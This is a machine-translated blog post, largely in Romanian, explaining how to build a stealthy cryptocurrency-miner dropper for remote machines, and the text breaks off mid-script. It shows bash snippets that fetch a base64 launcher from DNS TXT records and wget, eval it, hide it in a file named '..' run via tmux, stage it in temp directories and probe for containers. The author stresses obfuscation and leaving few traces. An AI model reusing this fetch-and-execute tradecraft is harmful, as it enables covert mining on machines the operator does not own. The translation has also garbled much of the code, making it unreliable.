<!DOCTYPE html><HTML lang="en"><head><meta charset="UTF-8"/><script type="application/ld+json">{"copyrightHolder":"untoreh","@id":"https://unto.re","url":"https://unto.re","copyrightYear":2021,"@context":"https://schema.org/","@type":"WebSite"}</script><script type="application/ld+json">{"audience":"cool people","url":"https://unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","author":"untoreh","description":"...How far are you willing to go for...pennies?","mentions":[],"accessModeSufficient":{"itemListElement":["textual","visual"],"description":"text and images","@type":"itemList"},"lastReviewed":"August 21, 2021","@type":"https://schema.org/WebPage","dateCreated":"August 21, 2021","@id":"https://unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"August 21, 2021","abstract":"...How far are you willing to go for...pennies?","headline":"Chronicles of a cryptonote dropper","creativeWorkStatus":"Published","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"datePublished":"August 21, 2021","inLanguage":"English","name":"Chronicles of a cryptonote dropper","identifier":"https://unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html"}</script><meta content="width=device-width, initial-scale=1" name="viewport"/><link href="/libs/highlight/github.min.css" rel="stylesheet"/><link href="/css/franklin.css" rel="stylesheet"/><link href="/css/main.css" rel="stylesheet"/><link href="/css/menu.css" rel="stylesheet"/><link href="/css/pages.css" rel="stylesheet"/><link href="/css/lunr.css" rel="stylesheet"/><link href="/css/footer.css" rel="stylesheet"/><link href="/css/responsive.css" rel="stylesheet"/><link href="/css/animations.css" rel="stylesheet"/><link href="/css/docco.css" rel="stylesheet"/><link href="/css/flag-icon.min.css" rel="stylesheet"/><link href="/assets/favicon.png" rel="icon"/><title> Cronici ale unui picurător de criptonote</title><script src="/libs/lunr/lunr.min.js"></script><script src="/libs/lunr/lunr_index.js"></script><script src="/libs/lunr/lunrclient.min.js"></script><script src="/libs/load.js"></script><script type="application/ld+json">{"@id":"https://unto.re/ro/posts/chronichles_of_a_cryptonote_dropper/index.html","url":"https://unto.re/ro/posts/chronichles_of_a_cryptonote_dropper/index.html","abstract":null,"headline":null,"keywords":null,"description":null,"mentions":null,"translator":{"url":"https://translate.google.com/","name":"Google","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"/home/fra/dev/blog/https://unto.re/"},"inLanguage":"ro","name":null,"@type":"https://schema.org/WebPage"}</script></head><body class=""><div class="masthead"><div class="masthead__inner-wrap"><div class="masthead__menu"><a class="site-title" href="/ro/"></a><div class="author__wrap"><script type="application/ld+json">{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"description":"<ul>\n<li><p><strong>Name</strong>: Francesco Giannelli</p>\n</li>\n<li><p><strong>Website</strong>: &#91;«https://unto.re»&#93;, the place where I put stuff I should remember...or forget</p>\n</li>\n<li><p><strong>Location</strong>: south italy {{bio_link}}</p>\n</li>\n<li><p><strong>Year</strong>: &#39;91</p>\n</li>\n</ul>\n","image":"/assets/appa.png","name":"untoreh","@type":"https://schema.org/Person","email":"contact@unto.re"}</script><ul><li class="author__avatar" onclick="toggleTheme()"><img alt=" untoreh-light" class="flip-front" src="/assets/appa.png"/></li><li class="author__urls social-icons"><a href="https://twitter.com/untoreh" rel="nofollow noopener noreferrer"><i aria-hidden="true" class="fab fa-fw fa-twitter-square"></i></a></li><li class="author__urls social-icons"><a href="https://github.com/untoreh" rel="nofollow noopener noreferrer"><i aria-hidden="true" class="fab fa-fw fa-github"></i></a></li><li class="author__urls social-icons"><a href="mailto:contact@unto.re"><i class="fas fa-envelope"></i></a></li><li><script type="application/ld+json">{"potentialAction":{"query-input":"required maxlength=100 name=query","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":"https://unto.re/search?&q={query}"}}</script></li></ul></div><nav id="site-nav"><div class="horiz"><ul><li class="masthead__menu-item hvr-outline-in" id="lunrSearch"><form id="lunrSearchForm" name="lunrSearchForm"><button class="search-button" formaction="/search/index.html" type="submit" value="Search"><i class="fas fa-search menu-icons"></i></button><input class="search-input" name="q" placeholder="Search…" type="text"/></form></li><li class="masthead__menu-item hvr-outline-in"><a href="/ro/posts/" title="All the articles that I have written"><i class="fas fa-pen menu-icons"></i> postări</a></li><li class="masthead__menu-item hvr-outline-in"><a href="/ro/about/" title="Things about me, what I have read, past projects and ideas for future ones"><i class="fas fa-user-alt menu-icons"></i> despre</a></li><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website&#39;s language"><button class="langs-dropdown-wrapper"><i class="fas fa-language menu-icons"></i> Lang
            <div class="langs-dropdown-content" id="langs-dropdown-menu"><ul id="lang-list"><a class="lang-link" href="/ar/posts/chronichles_of_a_cryptonote_dropper" id="lang-ar"><span class="flag-icon flag-icon-sa"></span> arabic</a><a class="lang-link" href="/ro/bn/posts/chronichles_of_a_cryptonote_dropper" id="lang-bn"><span class="flag-icon flag-icon-bd"></span> Bengaleză</a><a class="lang-link" href="/ro/nl/posts/chronichles_of_a_cryptonote_dropper" id="lang-nl"><span class="flag-icon flag-icon-nl"></span> Olandeză</a><a class="lang-link" href="/ro/en/posts/chronichles_of_a_cryptonote_dropper" id="lang-en"><span class="flag-icon flag-icon-gb"></span> Engleză</a><a class="lang-link" href="/ro/tl/posts/chronichles_of_a_cryptonote_dropper" id="lang-tl"><span class="flag-icon flag-icon-ph"></span> Filipinez</a><a class="lang-link" href="/ro/fr/posts/chronichles_of_a_cryptonote_dropper" id="lang-fr"><span class="flag-icon flag-icon-fr"></span> limba franceza</a><a class="lang-link" href="/ro/de/posts/chronichles_of_a_cryptonote_dropper" id="lang-de"><span class="flag-icon flag-icon-de"></span> limba germana</a><a class="lang-link" href="/ro/el/posts/chronichles_of_a_cryptonote_dropper" id="lang-el"><span class="flag-icon flag-icon-gr"></span> Greacă</a><a class="lang-link" href="/ro/hi/posts/chronichles_of_a_cryptonote_dropper" id="lang-hi"><span class="flag-icon flag-icon-in"></span> hindi</a><a class="lang-link" href="/ro/it/posts/chronichles_of_a_cryptonote_dropper" id="lang-it"><span class="flag-icon flag-icon-it"></span> Italiană</a><a class="lang-link" href="/ro/ja/posts/chronichles_of_a_cryptonote_dropper" id="lang-ja"><span class="flag-icon flag-icon-jp"></span> japonez</a><a class="lang-link" href="/ro/jw/posts/chronichles_of_a_cryptonote_dropper" id="lang-jw"><span class="flag-icon flag-icon-id"></span> Javaneză</a><a class="lang-link" href="/ro/ko/posts/chronichles_of_a_cryptonote_dropper" id="lang-ko"><span class="flag-icon flag-icon-kr"></span> coreeană</a><a class="lang-link" href="/ro/ms/posts/chronichles_of_a_cryptonote_dropper" id="lang-ms"><span class="flag-icon flag-icon-ms"></span> Malay</a><a class="lang-link" href="/ro/zh/posts/chronichles_of_a_cryptonote_dropper" id="lang-zh"><span class="flag-icon flag-icon-cn"></span> Chineză mandarină</a><a class="lang-link" href="/ro/pl/posts/chronichles_of_a_cryptonote_dropper" id="lang-pl"><span class="flag-icon flag-icon-pl"></span> Lustrui</a><a class="lang-link" href="/ro/pt/posts/chronichles_of_a_cryptonote_dropper" id="lang-pt"><span class="flag-icon flag-icon-pt"></span> Portugheză</a><a class="lang-link" href="/ro/pa/posts/chronichles_of_a_cryptonote_dropper" id="lang-pa"><span class="flag-icon flag-icon-in"></span> Punjabi</a><a class="lang-link" href="/ro/ro/posts/chronichles_of_a_cryptonote_dropper" id="lang-ro"><span class="flag-icon flag-icon-ro"></span> Română</a><a class="lang-link" href="/ro/ru/posts/chronichles_of_a_cryptonote_dropper" id="lang-ru"><span class="flag-icon flag-icon-ru"></span> Rusă</a><a class="lang-link" href="/ro/es/posts/chronichles_of_a_cryptonote_dropper" id="lang-es"><span class="flag-icon flag-icon-es"></span> Spaniolă</a><a class="lang-link" href="/ro/sv/posts/chronichles_of_a_cryptonote_dropper" id="lang-sv"><span class="flag-icon flag-icon-se"></span> suedez</a><a class="lang-link" href="/ro/th/posts/chronichles_of_a_cryptonote_dropper" id="lang-th"><span class="flag-icon flag-icon-th"></span> Thai</a><a class="lang-link" href="/ro/tr/posts/chronichles_of_a_cryptonote_dropper" id="lang-tr"><span class="flag-icon flag-icon-tr"></span> turc</a><a class="lang-link" href="/ro/uk/posts/chronichles_of_a_cryptonote_dropper" id="lang-uk"><span class="flag-icon flag-icon-ua"></span> Ucrainean</a><a class="lang-link" href="/ro/ur/posts/chronichles_of_a_cryptonote_dropper" id="lang-ur"><span class="flag-icon flag-icon-pk"></span> Urdu</a><a class="lang-link" href="/ro/vi/posts/chronichles_of_a_cryptonote_dropper" id="lang-vi"><span class="flag-icon flag-icon-vn"></span> Vietnameză</a><a class="lang-link" href="/ro/zu/posts/chronichles_of_a_cryptonote_dropper" id="lang-zu"><span class="flag-icon flag-icon-za"></span> Zulu</a></ul></div></button></li></ul></div><button class="ham"><i class="fas fa-bars ham-icon"></i></button><div class="vert"><ul><li class="masthead__menu-item hvr-outline-in" id="lunrSearch"><form id="lunrSearchForm" name="lunrSearchForm"><button class="search-button" formaction="/search/index.html" type="submit" value="Search"><i class="fas fa-search menu-icons"></i></button><input class="search-input" name="q" placeholder="Search…" type="text"/></form></li><li class="masthead__menu-item hvr-outline-in"><a href="/ro/posts/" title="All the articles that I have written"><i class="fas fa-pen menu-icons"></i> postări</a></li><li class="masthead__menu-item hvr-outline-in"><a href="/ro/about/" title="Things about me, what I have read, past projects and ideas for future ones"><i class="fas fa-user-alt menu-icons"></i> despre</a></li><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website&#39;s language"><button class="langs-dropdown-wrapper"><i class="fas fa-language menu-icons"></i> Lang
            <div class="langs-dropdown-content" id="langs-dropdown-menu"><ul id="lang-list"><a class="lang-link" href="/ar/posts/chronichles_of_a_cryptonote_dropper" id="lang-ar"><span class="flag-icon flag-icon-sa"></span> arabic</a><a class="lang-link" href="/ro/bn/posts/chronichles_of_a_cryptonote_dropper" id="lang-bn"><span class="flag-icon flag-icon-bd"></span> Bengaleză</a><a class="lang-link" href="/ro/nl/posts/chronichles_of_a_cryptonote_dropper" id="lang-nl"><span class="flag-icon flag-icon-nl"></span> Olandeză</a><a class="lang-link" href="/ro/en/posts/chronichles_of_a_cryptonote_dropper" id="lang-en"><span class="flag-icon flag-icon-gb"></span> Engleză</a><a class="lang-link" href="/ro/tl/posts/chronichles_of_a_cryptonote_dropper" id="lang-tl"><span class="flag-icon flag-icon-ph"></span> Filipinez</a><a class="lang-link" href="/ro/fr/posts/chronichles_of_a_cryptonote_dropper" id="lang-fr"><span class="flag-icon flag-icon-fr"></span> limba franceza</a><a class="lang-link" href="/ro/de/posts/chronichles_of_a_cryptonote_dropper" id="lang-de"><span class="flag-icon flag-icon-de"></span> limba germana</a><a class="lang-link" href="/ro/el/posts/chronichles_of_a_cryptonote_dropper" id="lang-el"><span class="flag-icon flag-icon-gr"></span> Greacă</a><a class="lang-link" href="/ro/hi/posts/chronichles_of_a_cryptonote_dropper" id="lang-hi"><span class="flag-icon flag-icon-in"></span> hindi</a><a class="lang-link" href="/ro/it/posts/chronichles_of_a_cryptonote_dropper" id="lang-it"><span class="flag-icon flag-icon-it"></span> Italiană</a><a class="lang-link" href="/ro/ja/posts/chronichles_of_a_cryptonote_dropper" id="lang-ja"><span class="flag-icon flag-icon-jp"></span> japonez</a><a class="lang-link" href="/ro/jw/posts/chronichles_of_a_cryptonote_dropper" id="lang-jw"><span class="flag-icon flag-icon-id"></span> Javaneză</a><a class="lang-link" href="/ro/ko/posts/chronichles_of_a_cryptonote_dropper" id="lang-ko"><span class="flag-icon flag-icon-kr"></span> coreeană</a><a class="lang-link" href="/ro/ms/posts/chronichles_of_a_cryptonote_dropper" id="lang-ms"><span class="flag-icon flag-icon-ms"></span> Malay</a><a class="lang-link" href="/ro/zh/posts/chronichles_of_a_cryptonote_dropper" id="lang-zh"><span class="flag-icon flag-icon-cn"></span> Chineză mandarină</a><a class="lang-link" href="/ro/pl/posts/chronichles_of_a_cryptonote_dropper" id="lang-pl"><span class="flag-icon flag-icon-pl"></span> Lustrui</a><a class="lang-link" href="/ro/pt/posts/chronichles_of_a_cryptonote_dropper" id="lang-pt"><span class="flag-icon flag-icon-pt"></span> Portugheză</a><a class="lang-link" href="/ro/pa/posts/chronichles_of_a_cryptonote_dropper" id="lang-pa"><span class="flag-icon flag-icon-in"></span> Punjabi</a><a class="lang-link" href="/ro/ro/posts/chronichles_of_a_cryptonote_dropper" id="lang-ro"><span class="flag-icon flag-icon-ro"></span> Română</a><a class="lang-link" href="/ro/ru/posts/chronichles_of_a_cryptonote_dropper" id="lang-ru"><span class="flag-icon flag-icon-ru"></span> Rusă</a><a class="lang-link" href="/ro/es/posts/chronichles_of_a_cryptonote_dropper" id="lang-es"><span class="flag-icon flag-icon-es"></span> Spaniolă</a><a class="lang-link" href="/ro/sv/posts/chronichles_of_a_cryptonote_dropper" id="lang-sv"><span class="flag-icon flag-icon-se"></span> suedez</a><a class="lang-link" href="/ro/th/posts/chronichles_of_a_cryptonote_dropper" id="lang-th"><span class="flag-icon flag-icon-th"></span> Thai</a><a class="lang-link" href="/ro/tr/posts/chronichles_of_a_cryptonote_dropper" id="lang-tr"><span class="flag-icon flag-icon-tr"></span> turc</a><a class="lang-link" href="/ro/uk/posts/chronichles_of_a_cryptonote_dropper" id="lang-uk"><span class="flag-icon flag-icon-ua"></span> Ucrainean</a><a class="lang-link" href="/ro/ur/posts/chronichles_of_a_cryptonote_dropper" id="lang-ur"><span class="flag-icon flag-icon-pk"></span> Urdu</a><a class="lang-link" href="/ro/vi/posts/chronichles_of_a_cryptonote_dropper" id="lang-vi"><span class="flag-icon flag-icon-vn"></span> Vietnameză</a><a class="lang-link" href="/ro/zu/posts/chronichles_of_a_cryptonote_dropper" id="lang-zu"><span class="flag-icon flag-icon-za"></span> Zulu</a></ul></div></button></li></ul></div></nav></div></div></div><div><h1 id="title"><a href="/ro/posts/chronichles_of_a_cryptonote_dropper"> Cronici ale unui picurător de criptonote</a></h1><blockquote id="page-description" style="font-style: italic;"> 
                ... Cât de departe ești dispus să mergi pentru ... bănuți?
            </blockquote></div><div class="franklin-content"><p> Să presupunem că vrei a mea<a href="https://en.wikipedia.org/wiki/Cryptocurrency"> criptomonede</a>  pe telecomandă<em> virtual</em>  hardware. Trebuie să găsești ceva pentru mine. Servere la distanță înseamnă, nu<a href="https://en.wikipedia.org/wiki/Application-specific_integrated_circuit"> ASICS</a>  sau GPU dovada algoritmilor de lucru, practic numai<a href="\posts/a-few-notes-on-proof-of-work"> Monede prietenoase cu CPU</a>.</p><h2 id="the_software"><a class="header-anchor" href="#the_software"> Software-ul</a></h2><p> Căutați și găsiți un<a href="https://github.com/xmrig/xmrig"> miner</a> , dar nu este chiar frumos, ai vrea ceva ce poți controla mai bine de la distanță, așa că vei găsi<a href="https://github.com/Bendr0id/xmrigCC"> un alt miner</a> . Vrei și tu un<a href="https://github.com/Bendr0id/xmrigcc-proxy"> proxy</a> , deoarece multe conexiuni vor fi de scurtă durată, nu doriți<a href="https://en.wikipedia.org/wiki/Denial-of-service_attack"> dos</a>  piscina ta minieră. Deasemenea o<a href="https://github.com/search?q=tunnel"> tunel</a>  ar fi frumos.</p><h2 id="the_design"><a class="header-anchor" href="#the_design"> Design-ul</a></h2><p> Unele botnet utilizează date blockchains pentru a căuta comenzi,<a href="https://twitter.com/sarahjamielewis"> cineva</a>  pare, de asemenea, să aibă<a href="https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968"> pariuri pierdute</a>  dacă acest lucru nu se mai întâmplă ... oricum nu suntem atât de sofisticați, vom trece cu niște înregistrări DNS care stochează un script care trage sarcina utilă pe care o extrage singură într-un director temporal executată și o lasă<em> aproape</em>  fără urme ale configurării sale. Iată o mică diagramă care descrie structura</p><img alt="" src="/assets/posts/output/payload.png"/><h2 id="launcher"><a class="header-anchor" href="#launcher"> Lansator</a></h2><p> Scopul unui script de pornire este să fie accesibil și ușor de actualizat, astfel încât să reziste testului timpului. Se actualizează<a href="https://en.wikipedia.org/wiki/Domain_Name_System"> DNS</a>  înregistrările sunt ușoare, iar DNS este ultimul lucru care se oprește într-o rețea .. deoarece adresele IP sunt greu de reținut ... deci sunt șanse să fie disponibile de cele mai multe ori. Vedeți când suntem<em> preluarea scriptului de implementare</em>de fapt rulăm deja unele logici, acesta este scriptul lansator, are nevoie de capacitatea de a efectua interogări DNS pentru a căuta înregistrările noastre, DNS ar putea fi omniprezent, dar<a href="https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/"> săpa</a>  nu este.</p><p> Există un pic de enigmă aici, dacă trebuie să descărcăm un alt instrument<em> pentru a descărca un alt script pentru a descărca sarcina utilă</em>  ar trebui doar să descărcăm sarcina utilă! În apărare ... a face acest dans scripty adaugă la ofuscare, permite să păstreze o singură implementare a lansatorului (mentenabilitate, da), nu este necesar de cele mai multe ori ..<a href="https://en.wikipedia.org/wiki/Standalone_program"> legat static</a>  săpun executabil pentru a efectua interogări dns, preluate fie prin auto-găzduire, fie prin găzduire cloud (da, există soluții alternative, cum ar fi 3 sau 4, deoarece serviciile cloud au lățime de bandă gratuită foarte mică și necesită, de asemenea, cookie-uri sau jetoane de acces ... sunt foarte script neprietenos, intenționat, bineînțeles).</p><p> Ce este în înregistrările dns? Folosim<a href="https://en.wikipedia.org/wiki/TXT_record"> txt</a>  înregistrări, pe un domeniu personalizat (alternative de rezervă și aici). De ce TXT? se întâmplă să fie cei care pot stoca cea mai mare cantitate de date .. de obicei, deoarece este un fel de<a href="https://www.ietf.org/rfc/rfc6763.txt"> recomandat</a>  depinde de<em> lucruri</em> . Folosim în mod specific<a href="https://www.cloudflare.com/"> cloudflare</a>  pentru jocul nostru DNS, deoarece este gratuit și este practic singurul jucător din oraș (<em> Ei bine, nu chiar, dar orice altă alternativă palează caracteristicile înțelepte</em> ). Se întâmplă să puteți stoca mai multe date pe<em> la fel</em>  înregistrare ... acest lucru începe să devină confuz și confuz pentru unele specificații ... (tangent) Cloudflare<a href="https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size"> folosit pentru</a>  permite<em> înlănțuit</em>Înregistrările TXT însumând ~ 9k octeți, documentele stau acum ~ 2k octeți, înainte de modificarea pe care o foloseam ~ 6k cred și serveam scriptul necomprimat, după aceea a trebuit să subțiu scriptul și să-l comprim înainte de mână (de fapt eu a încercat să folosească un<a href="https://freedns.afraid.org/"> freedns</a>  furnizor, mi s-a interzis într-o zi, presupunând că au o politică strictă de înregistrări TXT fără grăsime), totuși, compresia gzip pare să nu fie compatibilă cu conductele și încă provoacă probleme, așa că a trebuit să reușesc să înghesui scriptul fără compresie ( tangent final).</p><p> Cum o stocăm? Înregistrările TXT acceptă doar șiruri alfanumerice, nu<a href="https://en.wikipedia.org/wiki/Null_character"> NUL</a> , deci trebuie să-l înfășurăm într-o codificare non nulă,<a href="https://en.wikipedia.org/wiki/Base64"> baza64</a>  satisface această constrângere și pentru că stocăm<em> înlănțuit</em>  Înregistrările TXT, trebuie să împingem ieșirea, deoarece folosim chestii shell, acest lucru se face prin<code>-w</code>  flag, pe busybox, un astfel de flag era absent (sau opt-in) pe versiunile mai vechi, care era enervant, o alternativă este utilizarea codificatorului inclus cu openssl,<code>openssl enc -base64</code>.</p><p> Acum, că știm cum să stocăm scriptul de implementare, îl stocăm cu oricare<a href="https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md"> cf cli</a>  sau manual. Cum o tragem? Am menționat că avem nevoie de bindutile sau ale noastre<code>dig</code> ... după ce am ales punctul final de servire, vrem să îl descărcăm, ceea ce este disponibil este de obicei<a href="https://www.gnu.org/software/wget/"> wget</a>  sau<a href="https://curl.se/"> răsuci</a> , wget se găsește preinstalat mult mai des, totuși busybox oferă suport tls doar cu biblioteci dinamice, deci trebuie să vă asigurați că punctul final servește http sau utilitarul dvs. este<code>wget</code>  din gnu-utils</p><pre><code class="bash hljs"><span class="hljs-comment"># the wget command</span>
wget -t 2 -T 10 -q -i- -O- &gt; <span class="hljs-variable">$filename</span> &lt;&lt;&lt; <span class="hljs-string">"<span class="hljs-variable"> $ digurl</span>"</span></code></pre><p> Înseamnă să încerci<code>-t2</code>  ori de asteptare<code>-T10</code>  secunde fiind<code>-q</code>  lectură liniștită din<code>-i-</code>  stdin (<code>$digurl</code> ) și scriind către<code>-O-</code>  stdout (<code>$filename</code>). Această comandă nu dezvăluie ce descărcăm la prima vedere. Vom fi foarte atenți cu alte comenzi de shell din același motiv sau rămânem cu shell (<a href="https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29"> bash</a> ) încorporate acolo unde este posibil. Aveți grijă și de unde descărcați executabilele, doriți să vă asigurați că le puteți executa, deoarece unele puncte de montare, în special în containere și<code>tmp</code>  căile sunt<code>noexec</code> . Acum că avem instrumentul nostru de interogare dns, ne preluăm înregistrările</p><pre><code class="bash hljs">dig txt <span class="hljs-variable">${record}</span>.<span class="hljs-variable">${zone}</span> +short +tcp +timeout=3 +retries=0 <span class="hljs-variable">$dnsserver</span></code></pre><p> Steagurile se explică aici,<code>+short</code>  înseamnă doar că ne interesează doar datele în sine, astfel încât nu trebuie să analizăm rezultatul. Este important să specificați serverul DNS, cum ar fi google (<code>8.8.8.8</code> ) sau cloudflare (<code>1.1.1.1</code> ), deoarece multe medii redirecționează sau interogează proxy dns către propriile servere dns în mod implicit. După ce am preluat scriptul blocat, ne ocupăm de ghilimele și spațiile albe pentru a-l pregăti pentru decodare</p><pre><code class="bash hljs">data=<span class="hljs-variable">${data//\"}</span><span class="hljs-comment"># remove quotes</span>
data=<span class="hljs-variable">${data// }</span><span class="hljs-comment"># remove whitespace</span><span class="hljs-built_in">declare</span> -a ar_data
<span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span><span class="hljs-variable">$data</span>; <span class="hljs-keyword">do</span>
    ar_data[<span class="hljs-variable">${l:0:1}</span>]=<span class="hljs-variable">${l:1}</span><span class="hljs-comment"># iterate over each line and remove the first characther</span><span class="hljs-keyword">done</span>
data=<span class="hljs-variable">${ar_data[@]}</span><span class="hljs-comment"># join all the lines</span>
data=<span class="hljs-variable">${data// }</span><span class="hljs-comment"># ensure joining didn't add whitespace</span><span class="hljs-comment"># decode</span>
launcher=$(<span class="hljs-built_in">echo</span><span class="hljs-string">"<span class="hljs-variable"> $ lansator</span>"</span> | <span class="hljs-variable"> $ b64</span>  -d -w<span class="hljs-variable"> $ chunksize</span>)</code></pre><p> Ce se întâmplă dacă acum noi<em> încă</em>  nu aveți lansatorul nostru? DNS este dezordonat, vrem o rezervă, permite configurarea unui subdomeniu pentru a prelua direct scriptul lansator. Înainte de a ne evalua scriptul, vrem să îl personalizăm, cu unele variabile, din nou, să folosim o înregistrare TXT pentru a stoca o listă de variabile NAME = VALUE și să o analizăm. Există, de asemenea, o rezervă pentru variabile, cloudflare oferă redirecționări bazate pe adrese URL, aceste redirecționări sunt servite<em> inainte de</em>  destinația, deci nu avem nevoie de un punct final, vrem doar să configurăm regulile de redirecționare bazate pe regex la un punct final fictiv, ceea ce ne interesează sunt parametrii adresei URL<code>?NAME=VALUE&amp;NAME2=VALUE2...</code>, astfel încât să putem parametriza lansatorul nostru pur și simplu prin schimbarea adresei URL de redirecționare, întotdeauna cu atenție la citarea și evadarea codurilor</p><pre><code class="bash hljs"><span class="hljs-comment">## m1 also important to stop wget</span>
pl_vars=$(<span class="hljs-built_in">echo</span><span class="hljs-string">"<span class="hljs-variable"> $ token_url</span>"</span>  | wget -t 1 -T 3 -q -i- -S 2&gt; &amp; 1 | grep -m1<span class="hljs-string"> 'Locație'</span> )
pl_vars =<span class="hljs-variable"> $ {pl_vars # * \ /}</span> 
pl_vars =<span class="hljs-variable"> $ {pl_vars // \ "&amp; / \"}</span> 
pl_vars =<span class="hljs-variable"> $ {pl_vars //% 3F / \?}</span></code></pre><p> Wget-ul<code>-S</code>  imprimă adresa URL de redirecționare care ne interesează pentru analiză. Având parametrii și scriptul, evaluăm variabilele care le scriu într-un fișier</p><pre><code class="bash hljs"><span class="hljs-built_in">eval</span><span class="hljs-string">"<span class="hljs-variable"> $ pl_vars</span>"</span><span class="hljs-built_in"> ecou</span><span class="hljs-string">"export \
<span class="hljs-variable"> $ pl_vars</span> \
<span class="hljs-variable"> $ ENV_VARS</span> \
"</span> &gt; env.sh</code></pre><p> Acest fișier va fi obținut prin scriptul de implementare. Ultima parte a scriptului de pornire este actuală<a href="https://en.wikipedia.org/wiki/Trampoline_(computing)"> trambulina</a> , evaluați scriptul în cadrul procesului de shell curent sau poate lăsați-l să fie gestionat de tmux, dacă este posibil.</p><pre><code class="bash hljs"><span class="hljs-comment"># printf preserves quotes</span><span class="hljs-built_in">eval</span><span class="hljs-string">"<span class="hljs-subst"> $ (printf '% s'<span class="hljs-string">"<span class="hljs-variable"> $ lansator</span>"</span>)</span>"</span>  &amp;&gt; / dev / null
<span class="hljs-comment"> # sau tmux</span><span class="hljs-built_in"> ecou</span><span class="hljs-string">"<span class="hljs-variable"> $ lansator</span>"</span> &gt; <span class="hljs-string">".. "</span> 
tmux send-keys -t miner<span class="hljs-string">". ./\".. \""</span>  introduce</code></pre><p> Scriptul lansatorului este aruncat într-un fișier numit „..”, acesta pare confuz, deoarece poate fi confundat cu un fișier<em> mamă</em>  director. Și nu includem comanda de sesiune, deoarece aceasta ar persista în comanda de proces, în schimb începem sesiunea tmux în prealabil și trimitem comanda sursă prin interfața terminalului tmux. În legătură cu aceasta, uneori se apelează un executabil cu<code>./</code>  păstrează acele caractere în comandă, deci este mai bine să adăugați fișierul<code>$PWD</code>  spre cale ..<code>PATH=$PWD:$PATH</code>.</p><h2 id="the_payload"><a class="header-anchor" href="#the_payload"> Sarcina utilă</a></h2><p> Scriptul nostru de implementare începe prin aprovizionarea cu<code>env.sh</code>  fișier, și păstrarea sau configurarea varurilor ca<code>STARTING_*</code>  vars ca.</p><pre><code class="bash hljs">STARTING_PATH=<span class="hljs-variable">${STARTING_PATH:-<span class="hljs-variable"> $ PATH</span>}</span> 
STARTING_PID =<span class="hljs-variable"> $ BASHPID</span></code></pre><p> Acest lucru ne permite să ucidem și să repornim o instanță care rulează în timp ce resetăm mediul. Permite trecerea la un director tmp cu funcții de executare</p><pre><code class="bash hljs"><span class="hljs-comment"># out local subdirectory</span>
pathname=$(<span class="hljs-built_in">printf</span><span class="hljs-string">".%-<span class="hljs-subst"> $ ((RANDOM% 9 + 1)</span> ) s "</span><span class="hljs-keyword"> pentru</span>  ph<span class="hljs-keyword"> în</span>  {/ tmp, / dev / shm, / run, / var / tmp, / var / cache, ~ /.<span class="hljs-built_in"> local</span> , ~ / .cache, ~ /};<span class="hljs-keyword"> do</span> 
    rm -rf<span class="hljs-string">"<span class="hljs-variable">$ ph</span>/<span class="hljs-variable"> $ calea</span>"</span>  &amp;&amp;
        mkdir -p<span class="hljs-string">"<span class="hljs-variable">$ ph</span>/<span class="hljs-variable"> $ calea</span>"</span>  &amp;&amp;
        tmppath =<span class="hljs-string">"<span class="hljs-variable">$ ph</span>/<span class="hljs-variable"> $ calea</span>"</span>  &amp;&amp;
        is_path_executable<span class="hljs-string">"<span class="hljs-variable"> $ tmppath</span>"</span> &amp;&amp;
        <span class="hljs-built_in"> export</span>  CALEA =<span class="hljs-string">"<span class="hljs-variable"> $ {ph}</span>/<span class="hljs-variable"> $ calea</span>:<span class="hljs-variable"> $ {PATH}</span>"</span>  tmppath &amp;&amp;
        <span class="hljs-built_in"> pauză</span><span class="hljs-keyword"> Terminat</span> 
[-n<span class="hljs-string">"<span class="hljs-variable"> $ tmppath</span>"</span> ] &amp;&amp; <span class="hljs-built_in"> CD</span><span class="hljs-string">"<span class="hljs-variable"> $ tmppath</span>"</span></code></pre><p> Verificarea dacă se află într-un<a href="https://en.wikipedia.org/wiki/OS-level_virtualization"> container</a>  este, de asemenea, la îndemână, putem testa sistemul de fișiere pentru indicii</p><pre><code class="bash hljs">c=$(<span class="hljs-built_in">builtin</span> compgen -G <span class="hljs-string">'/etc/cpa*'</span>)
d=$(<span class="hljs-built_in">builtin</span> compgen -G <span class="hljs-string">'/dev/*'</span>)
s=$(<span class="hljs-built_in">builtin</span> compgen -G <span class="hljs-string">'/sys/*'</span>)
p=$(<span class="hljs-built_in">builtin</span> compgen -G <span class="hljs-string">'/proc/*'</span>)
jail=
